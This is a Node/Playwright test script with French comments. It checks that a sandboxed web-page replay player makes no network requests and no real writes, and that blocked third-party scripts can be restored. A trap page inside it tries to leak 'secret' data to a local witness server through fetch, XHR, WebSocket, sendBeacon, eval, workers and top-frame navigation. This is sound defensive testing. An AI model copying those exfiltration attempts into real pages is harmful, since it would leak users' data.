/**
 * Sandbox v2, étape 2 (docs/tech/sandbox-v2.md §6) : lecture v2 sur des pages d'essai préparées à la
 * main depuis le banc, avant que la capture v2 (étape 3) n'existe. Chaque page est préparée comme la
 * capture v2 la rendra : CSS et images dans le document, scripts marqués à leur place (ceux de la page
 * gardés ; ceux d'un autre site bloqués, rétablissables), réponses GET que l'auteur a déclenchées pendant
 * sa capture. Puis la page est relue avec buildLiveSrcdoc (player-core), dans une iframe
 * sandbox="allow-scripts", et le parcours du visiteur de mesure-sandbox.cjs y est joué.
 *
 * Critères à 100 % contrôlés (le script échoue sinon) :
 *  - c) aucune sortie réseau depuis la lecture (détecteur vérifié par un témoin) ;
 *  - d) aucune écriture réelle : chaque écriture reçoit un succès fictif (compté par la page) ;
 *  - b) aucun script bloqué sans moyen de le rétablir : le script bloqué reste dans la page préparée, et
 *    le rétablir (keep) le fait s'exécuter sans recapture ;
 *  - banc : chaque site est servi, chaque parcours réussit entièrement sur le site vivant.
 * La fidélité d'interaction est relevée (objectif de la première livraison : 90 %).
 * Prérequis : node e2e/banc/serveur.cjs. Usage : node e2e/banc/lecture-v2.cjs [RAPPORT=…] [SHOTS_DIR=…]
 */
const { chromium } = require('playwright');
const fs = require('fs');
const { SITES, verifier, VIEW, BANC } = require('./mesure-sandbox.cjs');
const SHOTS = process.env.SHOTS_DIR;
const RAPPORT = process.env.RAPPORT;

/** Ce que l'auteur a capturé (pages et GET déclenchés), site par site, comme dans mesure-sandbox. */
const CAPTURES = {
  site: { pages: ['/site', '/site/offres', '/site/equipe'], gets: [] },
  spa: { pages: ['/app'], gets: ['/api/clients'] },
  liste: {
    pages: ['/liste'],
    gets: ['/api/produits?q=', '/api/produits?q=c', '/api/produits?q=cr', '/api/produits?q=crm'],
  },
  formulaire: { pages: ['/formulaire'], gets: [] },
  stockage: { pages: ['/stockage'], gets: [] },
  tiers: { pages: ['/tiers'], gets: [] },
  onglets: { pages: ['/onglets'], gets: ['/api/onglet/tarifs', '/api/onglet/avis'] },
  menu: { pages: ['/menu', '/menu/logiciels'], gets: [] },
};

const texte = async (u) => (await fetch(u)).text();
const dataUri = async (u) => {
  const r = await fetch(u);
  return `data:${r.headers.get('content-type')};base64,${Buffer.from(await r.arrayBuffer()).toString('base64')}`;
};

/** Page préparée (LivePage) depuis le site vivant. */
async function preparer(chemin, gets) {
  const url = BANC + chemin;
  let html = await texte(url);
  // CSS et images dans le document (comme la capture v1 et v2)
  for (const m of [...html.matchAll(/<link rel="stylesheet" href="([^"]+)">/g)])
    html = html.replace(m[0], `<style>${await texte(new URL(m[1], url))}</style>`);
  for (const m of [...html.matchAll(/<img src="([^"]+)"/g)])
    html = html.replace(m[0], `<img src="${await dataUri(new URL(m[1], url))}"`);
  const scripts = [];
  const parts = [];
  let last = 0;
  for (const m of html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/g)) {
    const id = `s${scripts.length + 1}`;
    const src = /\bsrc="([^"]+)"/.exec(m[1])?.[1];
    const abs = src ? new URL(src, url) : null;
    const tiers = abs && abs.origin !== new URL(url).origin;
    scripts.push({
      id,
      code: abs ? await texte(abs) : m[2],
      // §3.3 : scripts de la page gardés ; scripts d'un autre site bloqués par défaut, avec « Garder »
      keep: !tiers,
      source: abs ? abs.host : 'page',
      category: tiers ? (/analytics/.test(abs.pathname) ? 'tracking' : 'third') : 'page',
    });
    parts.push(html.slice(last, m.index), `<script data-fd-script="${id}"></script>`);
    last = m.index + m[0].length;
  }
  parts.push(html.slice(last));
  const responses = [];
  for (const g of gets) {
    const r = await fetch(BANC + g);
    responses.push({
      method: 'GET',
      url: BANC + g,
      status: r.status,
      type: r.headers.get('content-type'),
      body: await r.text(),
    });
  }
  return { url, html: parts.join(''), scripts, responses };
}

const HOTE = `<!doctype html><html><head><style>html,body{margin:0}iframe{border:0;width:${VIEW.width}px;height:${VIEW.height}px;display:block}</style></head>
<body><iframe id="f" sandbox="allow-scripts"></iframe><script>
  window.__nav = []; window.__ready = 0; window.__stats = { replayed: 0, unreplayed: 0, writes: 0 };
  addEventListener('message', (e) => {
    const d = e.data;
    if (!d || d.fd !== 1) return;
    if (d.t === 'ready') window.__ready++;
    if (d.t === 'nav') window.__nav.push(d.url);
    if (d.t === 'live') window.__last = d;
  });
</script></body></html>`;

/** Lecture v2 d'un site et parcours du visiteur ; sorties réseau et écritures relevées. */
async function lire(b, s, pages, buildLiveSrcdoc, opts = {}) {
  const ctx = await b.newContext({ viewport: VIEW, locale: 'fr-FR' });
  ctx.setDefaultTimeout(1500);
  // Une requête vue par le navigateur n'est une sortie que si la CSP ne l'a pas bloquée (Playwright
  // signale aussi les requêtes bloquées, en échec « csp », qui ne partent jamais)
  const vues = new Set();
  const csp = new Set();
  ctx.on('request', (r) => {
    if (!/^(data|about|blob):/.test(r.url())) vues.add(r);
  });
  ctx.on('requestfailed', (r) => {
    if (/csp/i.test(r.failure()?.errorText ?? '')) csp.add(r);
  });
  const sortiesDe = () => [...vues].filter((r) => !csp.has(r)).map((r) => `${r.method()} ${r.url()}`);
  const page = await ctx.newPage();
  const erreurs = [];
  page.on('pageerror', (e) => erreurs.push(e.message));
  page.on('console', (m) => m.type() === 'error' && erreurs.push(m.text()));
  await page.setContent(HOTE);
  const docs = new Map();
  for (const p of pages) docs.set(new URL(p.url).pathname, await buildLiveSrcdoc(p));
  // Statistiques cumulées sur toutes les pages visitées
  const total = { replayed: 0, unreplayed: 0, writes: 0 };
  const cumuler = async () => {
    const d = await page.evaluate(() => {
      const x = window.__last;
      window.__last = null;
      return x;
    });
    return d;
  };
  let courant = null;
  let vus = { replayed: 0, unreplayed: 0, writes: 0 };
  const fermer = () => {
    for (const k of Object.keys(total)) total[k] += vus[k];
    vus = { replayed: 0, unreplayed: 0, writes: 0 };
  };
  const charger = async (chemin) => {
    fermer();
    const avant = await page.evaluate(() => window.__ready);
    await page.evaluate((d) => (document.getElementById('f').srcdoc = d), docs.get(chemin));
    await page.waitForFunction((n) => window.__ready > n, avant, { timeout: 5000 });
    await page.evaluate(() =>
      document
        .getElementById('f')
        .contentWindow.postMessage(
          { fd: 1, t: 'init', mode: 'player', ops: [], autoLinks: [], unlinked: 'none' },
          '*',
        ),
    );
    courant = chemin;
    await page.waitForTimeout(150);
  };
  const suivre = async () => {
    const d = await cumuler();
    if (d) vus = { replayed: d.replayed, unreplayed: d.unreplayed, writes: d.writes };
    const nav = await page.evaluate(() => window.__nav.splice(0));
    if (!nav.length) return;
    const cible = new URL(nav[nav.length - 1]).pathname;
    // Page capturée : affichée (stockage neuf) ; sinon la visite reste sur la page courante
    if (docs.has(cible)) await charger(cible);
  };
  const c = page.frameLocator('#f');
  await charger(new URL(pages[0].url).pathname);
  const res = [];
  for (const g of opts.parcours ?? s.parcours) {
    let ok = false;
    try {
      if (g.faire) await g.faire(c);
      await page.waitForTimeout(300);
      await suivre();
      ok = await verifier(c, g);
    } catch {
      ok = false;
    }
    res.push(ok);
  }
  await page.waitForTimeout(150);
  await suivre();
  fermer();
  if (SHOTS) await page.screenshot({ path: `${SHOTS}/lecture-v2-${s.id}${opts.suffixe ?? ''}.png` });
  // Témoin : le détecteur voit une requête volontaire de la page hôte (retirée du compte)
  await page.evaluate((u) => fetch(u).catch(() => null), `${BANC}/banc.css?temoin`);
  await page.waitForTimeout(300);
  const sorties = sortiesDe();
  const temoin = sorties.some((u) => u.endsWith('?temoin'));
  await ctx.close();
  return {
    res,
    total,
    sorties: sorties.filter((u) => !u.endsWith('?temoin')),
    bloqueesCsp: csp.size,
    temoin,
    erreurs,
    courant,
  };
}

/** Parcours sur le site vivant (le banc est juste). */
async function vivant(b, s) {
  const ctx = await b.newContext({ viewport: VIEW, locale: 'fr-FR' });
  ctx.setDefaultTimeout(5000);
  const page = await ctx.newPage();
  await page.goto(BANC + s.depart);
  await s.pret(page);
  const res = [];
  for (const g of s.parcours) {
    try {
      if (g.faire) await g.faire(page);
      res.push(await verifier(page, g));
    } catch {
      res.push(false);
    }
  }
  await ctx.close();
  return res;
}

const pct = (n, d) => (d ? Math.round((n / d) * 1000) / 10 : 100);

async function principal() {
  // player-core importe ses modules sans extension (paquet lu par Vite) : résolution « .ts » pour Node
  require('node:module').register(
    `data:text/javascript,${encodeURIComponent(
      "export async function resolve(s, c, n) { try { return await n(s, c); } catch (e) { if (s.startsWith('.') && !/\\.\\w+$/.test(s)) return n(s + '.ts', c); throw e; } }",
    )}`,
  );
  const { buildLiveSrcdoc } = await import('../../../../packages/player-core/src/liveFrame.ts');
  const b = await chromium.launch();
  const rapport = [];
  for (const s of SITES) {
    const servi = (await fetch(BANC + s.depart).catch(() => null))?.ok === true;
    const banc = servi ? await vivant(b, s) : [];
    const cap = CAPTURES[s.id];
    const pages = servi ? await Promise.all(cap.pages.map((p) => preparer(p, cap.gets))) : [];
    const r = pages.length
      ? await lire(b, s, pages, buildLiveSrcdoc)
      : {
          res: [],
          total: { replayed: 0, unreplayed: 0, writes: 0 },
          sorties: [],
          temoin: false,
          erreurs: [],
        };
    const bloques = pages.flatMap((p) =>
      p.scripts.filter((x) => !x.keep).map((x) => `${x.source} (${x.category})`),
    );
    const ligne = {
      site: s.id,
      nom: s.nom,
      servi,
      banc: { gestes: s.parcours.length, reussis: banc.filter(Boolean).length },
      interaction: {
        reussis: r.res.filter(Boolean).length,
        gestes: s.parcours.length,
        detail: s.parcours.map((g, i) => ({ geste: g.nom, reprise: r.res[i] ?? false })),
      },
      reponses: r.total,
      bloques,
      sorties: r.sorties,
      temoin: r.temoin,
      erreurs: r.erreurs,
    };
    rapport.push(ligne);
    console.error(
      `${s.id} : banc ${ligne.banc.reussis}/${ligne.banc.gestes}, interaction ${ligne.interaction.reussis}/${ligne.interaction.gestes}, réponses ${r.total.replayed} rejouées / ${r.total.unreplayed} non rejouées, écritures fictives ${r.total.writes}, bloqués ${bloques.length}, sorties ${r.sorties.length}${r.erreurs.length ? `, erreurs : ${r.erreurs.join(' | ')}` : ''}`,
    );
  }

  // b) Rétablir un script bloqué, sans recapture : le widget de discussion du tiers s'exécute alors
  const tiers = SITES.find((x) => x.id === 'tiers');
  const page = await preparer('/tiers', []);
  const chat = page.scripts.find((x) => x.source.includes('54411') && /chat/.test(x.code));
  const sans = await lire(b, tiers, [page], buildLiveSrcdoc, {
    parcours: [{ nom: 'widget absent', texte: 'Ventes du mois', absent: 'Discuter avec nous' }],
  });
  chat.keep = true;
  const avec = await lire(b, tiers, [page], buildLiveSrcdoc, {
    parcours: [{ nom: 'widget rétabli', texte: 'Discuter avec nous' }],
    suffixe: '-retabli',
  });
  const retablir = sans.res[0] === true && avec.res[0] === true && avec.sorties.length === 0;

  // c) Page piège : un script gardé tente toutes les sorties connues ; aucune requête ne doit partir
  // Serveur témoin : il compte ce qui l'atteint vraiment (doit rester à 0)
  const atteint = [];
  const temoinSrv = require('http')
    .createServer((q, r) => {
      atteint.push(`${q.method} ${q.url}`);
      r.end('');
    })
    .listen(54412);
  const X = 'http://localhost:54412/fuite';
  const piege = {
    url: `${BANC}/piege-reseau`,
    html: `<!doctype html><html><head><style>body{background:url(${X}-css)}</style>
      <link rel="prefetch" href="${X}-prefetch"><link rel="stylesheet" href="${X}-link"></head><body>
      <h1>Piège réseau</h1><img src="${X}-img"><iframe src="${X}-iframe"></iframe>
      <form id="f" method="post" action="${X}-form"><button>Envoyer</button></form>
      <p id="fin">…</p><script data-fd-script="s1"></script></body></html>`,
    scripts: [
      {
        id: 's1',
        keep: true,
        code: `
          const essais = [];
          const tente = (n, f) => { try { const r = f(); if (r && r.catch) r.catch(() => {}); essais.push(n); } catch (e) { essais.push(n + '!'); } };
          tente('fetch', () => fetch('${X}-fetch', { method: 'POST', body: 'secret' }));
          tente('fetch-get', () => fetch('${X}-get'));
          tente('xhr', () => { const x = new XMLHttpRequest(); x.open('POST', '${X}-xhr'); x.send('secret'); });
          tente('ws', () => new WebSocket('ws://localhost:54412/fuite-ws'));
          tente('es', () => new EventSource('${X}-es'));
          tente('beacon', () => navigator.sendBeacon('${X}-beacon', 'secret'));
          tente('image', () => { new Image().src = '${X}-image'; });
          tente('script', () => { const s = document.createElement('script'); s.src = '${X}-script'; document.body.append(s); });
          tente('eval', () => eval("fetch('${X}-eval')"));
          tente('fonction', () => new Function("fetch('${X}-function')")());
          tente('open', () => window.open('${X}-open'));
          tente('worker', () => new Worker('${X}-worker'));
          tente('location', () => { location.href = '${X}-location'; });
          tente('top', () => { window.top.location = '${X}-top'; });
          tente('cookie', () => { document.cookie = 'a=b'; return localStorage.setItem('k', 'v'); });
          document.getElementById('fin').textContent = 'essais : ' + essais.join(',');
        `,
      },
    ],
    responses: [],
  };
  const fuite = await lire(b, { id: 'piege-reseau' }, [piege], buildLiveSrcdoc, {
    parcours: [
      { nom: 'essais faits', texte: 'essais : fetch,' },
      {
        nom: 'envoi du formulaire',
        faire: (c) => c.getByRole('button', { name: 'Envoyer' }).click(),
        texte: 'Piège',
      },
    ],
  });
  await new Promise((r) => setTimeout(r, 500));
  temoinSrv.close();
  const piegeOk =
    fuite.res.every(Boolean) && fuite.sorties.length === 0 && fuite.temoin && atteint.length === 0;
  console.error(
    `piège réseau : ${fuite.res.join(',')}, ${fuite.bloqueesCsp} requêtes bloquées par la CSP, sorties ${JSON.stringify(fuite.sorties)}, reçues par le serveur témoin ${JSON.stringify(atteint)}`,
  );
  await b.close();

  const tot = (f) => rapport.reduce((a, x) => a + f(x), 0);
  const total = {
    interaction: pct(
      tot((x) => x.interaction.reussis),
      tot((x) => x.interaction.gestes),
    ),
    reponses: pct(
      tot((x) => x.reponses.replayed),
      tot((x) => x.reponses.replayed + x.reponses.unreplayed),
    ),
    ecritures: tot((x) => x.reponses.writes),
    sorties: tot((x) => x.sorties.length),
  };
  console.log(JSON.stringify({ total, retablir, sites: rapport }, null, 2));
  const formulaire = rapport.find((x) => x.site === 'formulaire');
  const criteres = [
    ['Chaque site d’essai est servi', rapport.every((x) => x.servi)],
    [
      'Chaque parcours réussit entièrement sur le site vivant',
      rapport.every((x) => x.banc.reussis === x.banc.gestes),
    ],
    [
      'c) Aucune sortie réseau depuis la lecture (détecteur vérifié par un témoin)',
      total.sorties === 0 && rapport.every((x) => x.temoin),
    ],
    [
      'd) Aucune écriture réelle : l’envoi du formulaire reçoit un succès fictif, la page avance',
      formulaire.reponses.writes >= 1 &&
        formulaire.interaction.detail[1].reprise &&
        formulaire.sorties.length === 0,
    ],
    ['b) Un script bloqué se rétablit sans recapture', retablir],
    ['c) Page piège : 21 tentatives de sortie (réseau, cadres, navigation, eval), rien ne part', piegeOk],
  ];
  for (const [nom, ok] of criteres) {
    console.error(`${ok ? 'ok' : 'NOT OK'} - ${nom}`);
    if (!ok) process.exitCode = 1;
  }
  console.error(`Fidélité d’interaction : ${total.interaction} % (objectif 90 %)`);
  if (RAPPORT) fs.writeFileSync(RAPPORT, markdown(total, rapport, criteres));
}

function markdown(total, rapport, criteres) {
  const l = [];
  l.push(
    '| Site d’essai | Interaction | Réponses rejouées | Écritures fictives | Scripts bloqués | Sorties |',
  );
  l.push('|---|---|---|---|---|---|');
  for (const x of rapport)
    l.push(
      `| ${x.nom} | ${x.interaction.reussis}/${x.interaction.gestes} | ${x.reponses.replayed}/${x.reponses.replayed + x.reponses.unreplayed} | ${x.reponses.writes} | ${x.bloques.join(', ') || '–'} | ${x.sorties.length} |`,
    );
  l.push(
    `| **Total** | **${total.interaction} %** | **${total.reponses} %** | **${total.ecritures}** | | **${total.sorties}** |`,
  );
  l.push('', '### Gestes', '');
  for (const x of rapport)
    l.push(
      `- **${x.nom}** : ${x.interaction.detail.map((d) => `${d.reprise ? '✓' : '✗'} ${d.geste}`).join(' · ')}`,
    );
  l.push('', '### Critères à 100 %', '');
  for (const [nom, ok] of criteres) l.push(`- ${ok ? '✓' : '✗'} ${nom}`);
  return `${l.join('\n')}\n`;
}

if (require.main === module)
  principal().catch((e) => {
    console.error(e);
    process.exit(1);
  });
